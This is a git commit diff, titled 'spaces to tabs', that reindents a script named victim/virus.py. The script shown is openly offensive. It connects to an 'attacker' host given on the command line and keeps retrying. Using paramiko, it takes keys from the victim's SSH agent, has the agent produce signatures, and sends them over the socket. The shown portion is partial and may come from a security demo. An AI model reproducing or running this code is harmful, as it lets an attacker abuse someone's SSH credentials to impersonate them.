9e467987b9a49c9306379cd0774d61bea7159c10
Your Name <you@example.com>
2023-05-01 17:29:29 +0200

    spaces to tabs

--- victim/virus.py
+++ victim/virus.py
@@ -8,15 +8,15 @@ import argparse
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
-    parser.add_argument("--ip", required = True, help="Hostname of attacker")
+	parser = argparse.ArgumentParser()
+	parser.add_argument("--ip", required = True, help="Hostname of attacker")
 	args = parser.parse_args()
 
 
 
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        while True: 
-            try: 
+		while True: 
+			try: 
 				s.connect((args.ip, 12345))
 				agent = paramiko.Agent()
 				for key in agent.get_keys():
@@ -26,6 +26,6 @@ if __name__ == "__main__":
 					print(f'sig = {sig.hex()}')
 					s.sendall(sig)
 			except Exception as e:
-                print(e)
-                time.sleep(2)
+				print(e)
+				time.sleep(2)
 
